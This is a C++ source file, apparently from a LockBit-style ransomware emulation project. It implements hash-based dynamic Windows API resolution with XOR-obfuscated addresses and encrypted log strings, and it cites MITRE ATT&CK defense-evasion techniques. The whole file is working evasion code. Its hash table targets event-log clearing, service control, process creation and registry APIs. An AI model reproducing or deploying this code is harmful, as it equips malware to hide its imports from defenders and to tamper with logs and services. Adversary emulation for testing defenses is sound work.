#include "crypto/djb2.hpp"
#include "crypto/xor_obfuscation.hpp"
#include "logger.hpp"
#include "util/string_util.hpp"
#include "util/winapihelper.hpp"
#include <format>
#include <map>

#define API_HASH_XOR_KEY ((uintptr_t)0xf5ac5a63efd0d56d)

namespace winapi_helper
{

    DWORD processModule(LPCWSTR module);

    // Maps API hashes to the obfuscated address
    std::map<unsigned long, PDWORD> hashed_api_obf_addrs;

    // Maps desired API hashes to first char of the API name
    // Populated using https://www.convertcase.com/hashing/djb-hash-calculator
    std::map<unsigned long, char> hashed_api_first_char = {
        {0x77a04a89, 'C'}, // ChangeServiceConfigW
        {0x2517fe78, 'C'}, // CloseServiceHandle
        {0xbecc6920, 'C'}, // CoCreateInstance
        {0xc1cd8ee6, 'C'}, // CoInitializeEx
        {0x428dffe1, 'C'}, // CoInitializeSecurity
        {0x527a0217, 'C'}, // ControlService
        {0x09c43946, 'C'}, // CoSetProxyBlanket
        {0x6fa13223, 'C'}, // CreateMutexW
        {0x9a8deee7, 'C'}, // CreatePipe
        {0xaeb52e2f, 'C'}, // CreateProcessW
        {0x7f08f451, 'C'}, // CreateThread
        {0x66851295, 'C'}, // CreateToolhelp32Snapshot
        {0x0145f84c, 'C'}, // CoUninitialize
        {0xdc42f78c, 'E'}, // EnumDependentServicesW
        {0xc42939fd, 'E'}, // EvtClearLog
        {0xb8599eaa, 'E'}, // EvtClose
        {0x7ffc81f9, 'E'}, // EvtNextChannelPath
        {0xeb1fe9d5, 'E'}, // EvtOpenChannelConfig
        {0xa53eb414, 'E'}, // EvtOpenChannelEnum
        {0x41e67cd2, 'E'}, // EvtSaveChannelConfig
        {0x5ede5874, 'E'}, // EvtSetChannelConfigProperty
        {0x3c704e45, 'F'}, // FindResourceW
        {0xbc950fc5, 'G'}, // GetAdaptersInfo
        {0xaa63bfcc, 'G'}, // GetComputerNameW
        {0xd252a609, 'G'}, // GetComputerNameExW
        {0xe03908c0, 'G'}, // GetCurrentThread
        {0xe21026f9, 'G'}, // GetExitCodeProcess
        {0x89478d5b, 'G'}, // GetLogicalDriveStringsW
        {0x9b5bb599, 'G'}, // GetUserNameExW
        {0x9550b030, 'I'}, // IcmpCloseHandle
        {0x387fb7a2, 'I'}, // IcmpCreateFile
        {0x8fb64697, 'I'}, // IcmpSendEcho
        {0xdcde594d, 'L'}, // LoadResource
        {0x145a9296, 'L'}, // LockResource
        {0xd834fdd3, 'M'}, // MoveFileW
        {0xdc921ae4, 'N'}, // NtQueryDefaultUILanguage
        {0x7ac44b76, 'N'}, // NtQueryInstallUILanguage
        {0x54212e31, 'N'}, // NtSetInformationThread
        {0x7136fdd6, 'O'}, // OpenProcess
        {0xbaef479f, 'O'}, // OpenSCManagerW
        {0x7c8058df, 'O'}, // OpenServiceW
        {0x94f08b9d, 'P'}, // PeekNamedPipe
        {0xe18fc6e8, 'P'}, // Process32FirstW
        {0x9307647f, 'P'}, // Process32NextW
        {0x018db08d, 'Q'}, // QueryServiceStatusEx
        {0x736b3702, 'R'}, // RegCloseKey
        {0x46ceb3b4, 'R'}, // RegCreateKeyExW
        {0x34587300, 'R'}, // RegSetValueExW
        {0x3ca3aa1d, 'R'}, // RtlGetVersion
        {0x53ef6bf2, 'S'}, // SetFilePointer
        {0x70ea2e03, 'S'}, // SetHandleInformation
        {0x0c17a85d, 'S'}, // SizeofResource
        {0xeccda1ba, 'W'}, // WaitForSingleObject
    };

    // Maps API hashes to error codes obtained when attempting to fetch them
    std::map<unsigned long, DWORD> hashed_api_error_codes;

    // Checks if we already tried to resolve this API hash before and failed
    bool failedToFetchAPI(unsigned long hash)
    {
        return winapi_helper::hashed_api_error_codes.find(hash) != winapi_helper::hashed_api_error_codes.end();
    }

    // Checks if we already successfully resolved this API hash before
    bool obtainedApiAddress(unsigned long hash)
    {
        return winapi_helper::hashed_api_obf_addrs.find(hash) != winapi_helper::hashed_api_obf_addrs.end();
    }

    // Checks if we care about this API hash
    bool isTargetAPI(unsigned long hash, char first_char)
    {
        return hashed_api_first_char.find(hash) != hashed_api_first_char.end() && hashed_api_first_char[hash] == first_char;
    }

    // Registers failure to resolve a given API hash
    void indicateFailureToFetchAPI(unsigned long hash, DWORD error_code)
    {
        winapi_helper::hashed_api_obf_addrs[hash] = (PDWORD)API_HASH_XOR_KEY;
        winapi_helper::hashed_api_error_codes[hash] = error_code;
    }

    // Handle cases where the API hash resolves to a forwarded export rather than to an address
    void handleForwardedExport(const std::string &forwarding_dest, unsigned long original_hash)
    {
        // Get forwarded module and export names
        std::string::size_type pos = forwarding_dest.find('.');
        if (pos == forwarding_dest.npos)
        {
            winapi_helper::indicateFailureToFetchAPI(original_hash, FAIL_BAD_FORWARDED_NAME);
            XorLogger::LogError(std::format("{}: {}", XOR_LIT("Bad forwarding destination format for:"), forwarding_dest));
            return;
        }
        std::string forwarded_module_a = forwarding_dest.substr(0, pos);
        std::wstring forwarded_module = string_util::string_to_wstring(forwarded_module_a);
        std::string api_name = forwarding_dest.substr(pos + 1);
        unsigned long forwarded_hash = djb2::djb2(api_name.c_str());

        // Check if API name changed during forwarding and walk through forwarded module
        if (forwarded_hash != original_hash)
        {
            // Function name is different - check if we already attempted to grab it before
            if (winapi_helper::failedToFetchAPI(forwarded_hash))
            {
                // Ran into an issue when previously fetching the forwarded API
                winapi_helper::indicateFailureToFetchAPI(original_hash, FAIL_PROCESS_FORWARDED_MODULE);
                return;
            }
            else if (winapi_helper::obtainedApiAddress(forwarded_hash))
            {
                // Successfully got forwarded func address previously
                winapi_helper::hashed_api_obf_addrs[original_hash] = winapi_helper::hashed_api_obf_addrs[forwarded_hash];
                return;
            }

            // Mark new function hash as a desired processing target
            winapi_helper::hashed_api_first_char[forwarded_hash] = api_name.c_str()[0];
        }
        XorLogger::LogDebug(std::format("{}: {}", XOR_LIT("Processing forwarded module"), forwarded_module_a));
        DWORD result = winapi_helper::processModule(forwarded_module.c_str());
        if (result != ERROR_SUCCESS)
        {
            XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to process forwarded module. Error code: "), result));
            winapi_helper::indicateFailureToFetchAPI(original_hash, FAIL_PROCESS_FORWARDED_MODULE);
            winapi_helper::indicateFailureToFetchAPI(forwarded_hash, result);
            return;
        }
        XorLogger::LogDebug(XOR_LIT("Successfully processed forwarded module."));

        // If forwarded name changed, grab the function address. If the name stayed the same,
        // then the previous processModule call will have populated the address already.
        if (forwarded_hash != original_hash)
        {
            if (winapi_helper::failedToFetchAPI(forwarded_hash))
            {
                // Ran into an issue when fetching the forwarded API
                winapi_helper::indicateFailureToFetchAPI(original_hash, FAIL_PROCESS_FORWARDED_MODULE);
                XorLogger::LogError(XOR_LIT("Failed to fetch API from forwarded module."));
            }
            else if (winapi_helper::obtainedApiAddress(forwarded_hash))
            {
                // Successfully got forwarded func address
                winapi_helper::hashed_api_obf_addrs[original_hash] = winapi_helper::hashed_api_obf_addrs[forwarded_hash];
                XorLogger::LogDebug(XOR_LIT("Successfully found API address from forwarded module."));
            }
            else
            {
                // Couldn't find our forwarded API
                winapi_helper::indicateFailureToFetchAPI(original_hash, FAIL_FORWARDED_API_NOT_FOUND);
                XorLogger::LogError(XOR_LIT("Failed to find API in forwarded module."));
            }
        }
    }

    // Go through module EAT and harvest any APIs that match our target hashes
    // to populate hashed_api_obf_addrs
    // Reference: https://www.ired.team/offensive-security/defense-evasion/windows-api-hashing-in-malware
    // Reference: https://github.com/LloydLabs/Windows-API-Hashing/blob/master/resolve.c
    DWORD processModule(LPCWSTR module)
    {
        HMODULE h_library = LoadLibraryW(module);
        if (h_library == NULL)
        {
            DWORD error_code = GetLastError();
            XorLogger::LogError(std::format("{}: {}", XOR_LIT("LoadLibraryW failed with error code"), error_code));
            return error_code;
        }
        DWORD_PTR library_base = (DWORD_PTR)h_library;

        // Verify DOS and Image NT headers
        PIMAGE_DOS_HEADER p_dos_header = (PIMAGE_DOS_HEADER)h_library;
        if (p_dos_header->e_magic != IMAGE_DOS_SIGNATURE)
        {
            FreeLibrary(h_library);
            XorLogger::LogError(XOR_LIT("Module image did not have expected DOS signature."));
            return FAIL_BAD_IMAGE_DOS_SIGNATURE;
        }
        PIMAGE_NT_HEADERS p_image_nt_headers = (PIMAGE_NT_HEADERS)(library_base + p_dos_header->e_lfanew);
        if (p_image_nt_headers->Signature != IMAGE_NT_SIGNATURE)
        {
            FreeLibrary(h_library);
            XorLogger::LogError(XOR_LIT("Module image did not have expected NT signature."));
            return FAIL_BAD_IMAGE_NT_SIGNATURE;
        }

        // Verify image is a DLL
        if ((p_image_nt_headers->FileHeader.Characteristics & IMAGE_FILE_DLL) != IMAGE_FILE_DLL)
        {
            FreeLibrary(h_library);
            XorLogger::LogError(XOR_LIT("Module image is not a DLL."));
            return FAIL_IMAGE_NOT_A_DLL;
        }

        // Make sure library has exports
        DWORD rva_export_dir = p_image_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        DWORD rva_export_size = p_image_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
        if (rva_export_dir == 0)
        {
            FreeLibrary(h_library);
            XorLogger::LogError(XOR_LIT("Could not find module image exports. Null address."));
            return FAIL_IMAGE_EXPORT_DIR_NULL_ADDR;
        }
        else if (rva_export_size == 0)
        {
            FreeLibrary(h_library);
            XorLogger::LogError(XOR_LIT("Could not find module image exports. Export size 0."));
            return FAIL_IMAGE_EXPORT_DIR_EMPTY;
        }

        // Get addresses to export info
        PIMAGE_EXPORT_DIRECTORY p_export_dir = (PIMAGE_EXPORT_DIRECTORY)(library_base + rva_export_dir);
        PDWORD p_export_table = (PDWORD)(library_base + p_export_dir->AddressOfFunctions);
        PDWORD p_name_table = (PDWORD)(library_base + p_export_dir->AddressOfNames);
        PWORD p_ordinal_table = (PWORD)(library_base + p_export_dir->AddressOfNameOrdinals);

        // Iterate through exported functions, grab any whose hashes match desired ones
        for (int i = 0; i < p_export_dir->NumberOfNames; i++)
        {
            // Get function name
            DWORD rva_func_name = p_name_table[i];
            char *func_name = (char *)(library_base + rva_func_name);

            // Check if we want this API - also verify the first character to make sure this isn't a collision
            unsigned long hash = djb2::djb2(func_name);
            if (winapi_helper::isTargetAPI(hash, func_name[0]))
            {
                XorLogger::LogDebug(std::format(
                    "{} {} {} {:#010x}",
                    XOR_LIT("Found matching API"),
                    func_name,
                    XOR_LIT("with hash"),
                    hash
                ));

                if (winapi_helper::obtainedApiAddress(hash)) {
                    XorLogger::LogDebug(XOR_LIT("API address has already been found. Skipping."));
                    continue;
                }

                // Use ordinal to get function address
                DWORD rva_func_addr = p_export_table[p_ordinal_table[i]];
                PDWORD func_addr = (PDWORD)(library_base + rva_func_addr);

                // Check if address is actually a forwarder
                if (rva_func_addr >= rva_export_dir && rva_func_addr < rva_export_dir + rva_export_size)
                {
                    std::string forwarding_dest((char *)func_addr);
                    XorLogger::LogDebug(std::format("{} {}", XOR_LIT("API address is actually a forwarder to"), forwarding_dest));
                    winapi_helper::handleForwardedExport(forwarding_dest, hash);
                }
                else
                {
                    XorLogger::LogDebug(std::format("{} {:#014x}", XOR_LIT("Found API address"), reinterpret_cast<intptr_t>(func_addr)));

                    // Obfuscate address and save it
                    winapi_helper::hashed_api_obf_addrs[hash] = (PDWORD)((uintptr_t)func_addr ^ API_HASH_XOR_KEY);
                }
            }
        }
        return ERROR_SUCCESS;
    }

    /*
     * GetAPI:
     *      About:
     *          Given a desired API hash and module name, returns the process address
     *          for the given function.
     *          If the function fails to get the process address, it will return NULL
     *          and set error_code accordingly.
     *          Relevant API calls: LoadLibraryW
     *      Result:
     *          Process address, or NULL. error_code set to ERROR_SUCCESS or corresponding error code.
     *      MITRE ATT&CK Techniques:
     *          T1027.007: Obfuscated Files or Information: Dynamic API Resolution
     *          T1106: Native API
     *      CTI:
     *          https://redpiranha.net/news/look-lockbit-3-ransomware
     */
    FARPROC GetAPI(unsigned long hash, LPCWSTR module, DWORD *error_code)
    {
        // Check if we already tried getting this API before and ran into an error
        if (winapi_helper::failedToFetchAPI(hash))
        {
            *error_code = winapi_helper::hashed_api_error_codes[hash];
            XorLogger::LogError(std::format("{}: {}", XOR_LIT("Previously ran into error getting the API."), *error_code));
            return NULL;
        }

        // Check if this is our first time fetching this API
        if (!winapi_helper::obtainedApiAddress(hash))
        {
            XorLogger::LogDebug(std::format("{} {:#010x}", XOR_LIT("First time fetching API with hash"), hash));

            // First time parsing the associated module
            XorLogger::LogDebug(std::format("{} {}", XOR_LIT("Processing module"), string_util::wstring_to_string(module)));
            DWORD result = winapi_helper::processModule(module);
            if (result != ERROR_SUCCESS)
            {
                *error_code = result;
                winapi_helper::indicateFailureToFetchAPI(hash, *error_code);
                XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to process module. Error code"), *error_code));
                return NULL;
            }

            // Check if the API was successfully obtained after processing the module
            if (winapi_helper::failedToFetchAPI(hash))
            {
                *error_code = winapi_helper::hashed_api_error_codes[hash];
                XorLogger::LogError(std::format("{}: {}", XOR_LIT("Ran into error getting the API."), *error_code));
                return NULL;
            }
            else if (!winapi_helper::obtainedApiAddress(hash))
            {
                *error_code = FAIL_REQUESTED_API_NOT_FOUND;
                winapi_helper::indicateFailureToFetchAPI(hash, *error_code);
                XorLogger::LogError(XOR_LIT("Failed to find target API when processing module."));
                return NULL;
            }
            XorLogger::LogDebug(XOR_LIT("Successfully processed module and found API."));
        }

        // Deobfuscate the address
        PDWORD obfuscated_addr = winapi_helper::hashed_api_obf_addrs[hash];
        FARPROC addr = (FARPROC)((uintptr_t)obfuscated_addr ^ API_HASH_XOR_KEY);
        *error_code = ERROR_SUCCESS;
        return addr;
    }

} // namespace
